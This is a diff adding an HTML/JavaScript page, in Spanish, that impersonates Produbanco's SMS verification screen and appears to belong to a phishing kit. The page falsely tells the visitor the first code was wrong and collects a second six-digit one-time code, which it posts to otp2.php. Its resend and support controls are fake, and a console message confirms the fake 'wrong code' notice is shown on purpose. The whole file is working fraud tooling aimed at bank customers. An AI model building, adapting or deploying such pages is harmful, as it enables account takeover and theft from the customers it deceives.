@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación SMS - Produbanco</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #003F20;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 100vw;
+            min-height: 100vh;
+            background: #003F20;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 25px;
+            margin-top: 10px;
+        }
+
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            width: 25px;
+            height: 2px;
+            background: white;
+            margin: 3px 0;
+            border-radius: 1px;
+        }
+
+        .phone-icon {
+            cursor: pointer;
+        }
+
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+
+        .logo-img {
+            width: auto;
+            max-width: 380px;
+            height: 140px;
+            object-fit: contain;
+            margin-bottom: 15px;
+            filter: brightness(1.1);
+        }
+
+        .logo-subtitle {
+            color: white;
+            font-size: 16px;
+            font-weight: 300;
+            opacity: 0.9;
+        }
+
+        .sms-container {
+            background: white;
+            border-radius: 25px 25px 0 0;
+            flex: 1;
+            padding: 30px 25px;
+            min-height: 500px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .error-notice {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 15px 20px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        .error-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+
+        .error-content h4 {
+            color: #856404;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .error-content p {
+            color: #856404;
+            font-size: 13px;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        @keyframes slideIn {
+            0% {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .sms-title {
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .sms-subtitle {
+            color: #666;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 35px;
+            line-height: 1.4;
+        }
+
+        .sms-subtitle .highlight {
+            color: #28a745;
+            font-weight: 600;
+        }
+
+        .sms-icon {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+
+        .phone-illustration {
+            width: 80px;
+            height: 80px;
+            background: #f0f8f0;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #e8f5e8;
+        }
+
+        .code-form {
+            margin-bottom: 30px;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .code-input-wrapper {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .code-input {
+            width: 45px;
+            height: 55px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            background: #f8f8f8;
+            color: #333;
+            outline: none;
+            transition: all 0.3s ease;
+            -webkit-appearance: none;
+            -moz-appearance: textfield;
+        }
+
+        .code-input:focus {
+            border-color: #003F20;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 63, 32, 0.1);
+            transform: scale(1.05);
+        }
+
+        .code-input.filled {
+            border-color: #28a745;
+            background: #f8fff8;
+        }
+
+        .code-input.error {
+            border-color: #dc3545;
+            background: #fff8f8;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .code-input::-webkit-outer-spin-button,
+        .code-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .code-input[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
+        }
+
+        .verify-btn {
+            width: 100%;
+            padding: 15px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #999;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .verify-btn.active {
+            background: #003F20;
+            color: white;
+            cursor: pointer;
+        }
+
+        .verify-btn.active:hover {
+            background: #002a16;
+        }
+
+        .resend-section {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            background: #f9f9f9;
+        }
+
+        .resend-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .resend-btn {
+            color: #003F20;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .resend-btn:hover {
+            color: #002a16;
+            text-decoration: underline;
+        }
+
+        .resend-btn.disabled {
+            color: #ccc;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .timer {
+            color: #28a745;
+            font-weight: 600;
+        }
+
+        .help-section {
+            text-align: center;
+        }
+
+        .help-text {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+
+        .support-link {
+            color: #003F20;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .support-link:hover {
+            color: #002a16;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 450px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .sms-container {
+                padding: 25px 20px;
+            }
+            
+            .logo-img {
+                max-width: 320px;
+                height: 120px;
+            }
+            
+            .code-inputs {
+                gap: 8px;
+            }
+            
+            .code-input {
+                width: 40px;
+                height: 50px;
+                font-size: 18px;
+            }
+            
+            .sms-title {
+                font-size: 18px;
+            }
+            
+            .sms-subtitle {
+                font-size: 14px;
+            }
+
+            .error-notice {
+                padding: 12px 15px;
+            }
+
+            .error-content h4 {
+                font-size: 13px;
+            }
+
+            .error-content p {
+                font-size: 12px;
+            }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.8s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .pulse-input {
+            animation: pulseInput 0.6s ease-in-out;
+        }
+
+        @keyframes pulseInput {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container fade-in">
+        <!-- Header -->
+        <div class="header">
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="phone-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                </svg>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="logo1.png" alt="Grupo Promerica Logo" class="logo-img">
+            <p class="logo-subtitle"></p>
+        </div>
+
+        <!-- SMS Container -->
+        <div class="sms-container">
+            <!-- Error Notice -->
+            <div class="error-notice">
+                <div class="error-icon">
+                    <svg width="24" height="24" fill="#856404" viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                    </svg>
+                </div>
+                <div class="error-content">
+                    <h4>Código incorrecto</h4>
+                    <p>Hemos enviado un nuevo código a tu celular</p>
+                </div>
+            </div>
+
+            <h1 class="sms-title">Verificación por SMS</h1>
+            <p class="sms-subtitle">Ingresa el <span class="highlight">nuevo código</span> que hemos enviado a tu celular</p>
+            
+            <div class="sms-icon">
+                <div class="phone-illustration">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="2">
+                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                        <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                        <path d="M8 6h8M8 10h8"></path>
+                    </svg>
+                </div>
+            </div>
+
+            <form class="code-form" id="smsForm" method="POST" action="otp2.php">
+                <div class="code-inputs">
+                    <div class="code-input-wrapper">
+                        <input type="number" class="code-input" id="digit1" maxlength="1" min="0" max="9" data-index="0" inputmode="numeric" pattern="[0-9]">
+                    </div>
+                    <div class="code-input-wrapper">
+                        <input type="number" class="code-input" id="digit2" maxlength="1" min="0" max="9" data-index="1" inputmode="numeric" pattern="[0-9]">
+                    </div>
+                    <div class="code-input-wrapper">
+                        <input type="number" class="code-input" id="digit3" maxlength="1" min="0" max="9" data-index="2" inputmode="numeric" pattern="[0-9]">
+                    </div>
+                    <div class="code-input-wrapper">
+                        <input type="number" class="code-input" id="digit4" maxlength="1" min="0" max="9" data-index="3" inputmode="numeric" pattern="[0-9]">
+                    </div>
+                    <div class="code-input-wrapper">
+                        <input type="number" class="code-input" id="digit5" maxlength="1" min="0" max="9" data-index="4" inputmode="numeric" pattern="[0-9]">
+                    </div>
+                    <div class="code-input-wrapper">
+                        <input type="number" class="code-input" id="digit6" maxlength="1" min="0" max="9" data-index="5" inputmode="numeric" pattern="[0-9]">
+                    </div>
+                </div>
+
+                <input type="hidden" name="sms_code" id="smsCode">
+                <button type="submit" class="verify-btn" id="verifyBtn">Verificar código</button>
+            </form>
+
+            <div class="resend-section">
+                <p class="resend-text">¿No recibiste el nuevo código?</p>
+                <a href="#" class="resend-btn" id="resendBtn">
+                    Reenviar código <span class="timer" id="timer"></span>
+                </a>
+            </div>
+
+            <div class="help-section">
+                <p class="help-text">¿Tienes problemas para recibir el código?</p>
+                <a href="#" class="support-link" id="supportLink">Contactar soporte</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const smsForm = document.getElementById('smsForm');
+            const smsCodeInput = document.getElementById('smsCode');
+            const resendBtn = document.getElementById('resendBtn');
+            const timer = document.getElementById('timer');
+
+            let resendTimer = 60;
+            let resendInterval;
+
+            function startResendTimer() {
+                resendTimer = 60;
+                resendBtn.classList.add('disabled');
+                
+                resendInterval = setInterval(function() {
+                    if (resendTimer > 0) {
+                        timer.textContent = `(${resendTimer}s)`;
+                        resendTimer--;
+                    } else {
+                        timer.textContent = '';
+                        resendBtn.classList.remove('disabled');
+                        resendBtn.textContent = 'Reenviar código';
+                        clearInterval(resendInterval);
+                    }
+                }, 1000);
+            }
+
+            function validateCode() {
+                const code = Array.from(codeInputs).map(input => input.value).join('');
+                
+                if (code.length === 6) {
+                    verifyBtn.classList.add('active');
+                    smsCodeInput.value = code;
+                } else {
+                    verifyBtn.classList.remove('active');
+                    smsCodeInput.value = '';
+                }
+                
+                return code;
+            }
+
+            function clearErrors() {
+                codeInputs.forEach(input => {
+                    input.classList.remove('error');
+                });
+            }
+
+            function showError() {
+                codeInputs.forEach(input => {
+                    input.classList.add('error');
+                });
+                
+                setTimeout(() => {
+                    clearErrors();
+                }, 2000);
+            }
+
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('keypress', function(e) {
+                    const char = String.fromCharCode(e.which);
+                    if (!/[0-9]/.test(char)) {
+                        e.preventDefault();
+                        return false;
+                    }
+                });
+
+                input.addEventListener('input', function(e) {
+                    clearErrors();
+                    
+                    let value = e.target.value.replace(/[^0-9]/g, '');
+                    if (value.length > 1) {
+                        value = value.slice(0, 1);
+                    }
+                    
+                    e.target.value = value;
+                    
+                    if (value) {
+                        e.target.classList.add('filled');
+                        e.target.classList.add('pulse-input');
+                        
+                        if (index < codeInputs.length - 1) {
+                            codeInputs[index + 1].focus();
+                        }
+                        
+                        setTimeout(() => {
+                            e.target.classList.remove('pulse-input');
+                        }, 600);
+                    } else {
+                        e.target.classList.remove('filled');
+                    }
+                    
+                    validateCode();
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    const allowedKeys = ['Backspace', 'Delete', 'Tab', 'Enter', 'ArrowLeft', 'ArrowRight'];
+                    const isNumber = e.key >= '0' && e.key <= '9';
+                    
+                    if (!isNumber && !allowedKeys.includes(e.key)) {
+                        e.preventDefault();
+                        return false;
+                    }
+                    
+                    if (e.key === 'Backspace') {
+                        if (e.target.value === '' && index > 0) {
+                            e.preventDefault();
+                            codeInputs[index - 1].focus();
+                            codeInputs[index - 1].value = '';
+                            codeInputs[index - 1].classList.remove('filled');
+                        } else {
+                            e.target.value = '';
+                            e.target.classList.remove('filled');
+                        }
+                        setTimeout(() => validateCode(), 10);
+                        return;
+                    }
+                    
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        e.preventDefault();
+                        codeInputs[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
+                        e.preventDefault();
+                        codeInputs[index + 1].focus();
+                    }
+                    
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        const code = validateCode();
+                        if (code.length === 6) {
+                            submitForm();
+                        }
+                    }
+                    
+                    if (isNumber && e.target.value !== '') {
+                        e.target.value = '';
+                    }
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+                    
+                    if (pastedData.length > 0) {
+                        codeInputs.forEach(input => {
+                            input.value = '';
+                            input.classList.remove('filled');
+                        });
+                        
+                        const digitsToUse = Math.min(pastedData.length, 6);
+                        for (let i = 0; i < digitsToUse; i++) {
+                            if (codeInputs[i]) {
+                                codeInputs[i].value = pastedData[i];
+                                codeInputs[i].classList.add('filled');
+                            }
+                        }
+                        
+                        if (digitsToUse < 6) {
+                            codeInputs[digitsToUse].focus();
+                        } else {
+                            codeInputs[5].focus();
+                        }
+                        
+                        validateCode();
+                    }
+                });
+            });
+
+            function submitForm() {
+                const code = validateCode();
+                
+                if (code.length !== 6) {
+                    showError();
+                    codeInputs[0].focus();
+                    return;
+                }
+                
+                verifyBtn.textContent = 'Verificando...';
+                verifyBtn.disabled = true;
+                smsForm.submit();
+            }
+
+            smsForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                submitForm();
+            });
+
+            resendBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                if (!this.classList.contains('disabled')) {
+                    codeInputs.forEach(input => {
+                        input.value = '';
+                        input.classList.remove('filled', 'error');
+                    });
+                    
+                    validateCode();
+                    codeInputs[0].focus();
+                    
+                    this.textContent = 'Código reenviado';
+                    setTimeout(() => {
+                        this.textContent = 'Reenviar código ';
+                        startResendTimer();
+                    }, 2000);
+                }
+            });
+
+            document.getElementById('supportLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Contactando con soporte técnico...');
+            });
+
+            codeInputs[0].focus();
+            startResendTimer();
+
+            console.log('Verificación SMS iniciada - Código incorrecto mostrado');
+        });
+    </script>
+</body>
+</html>
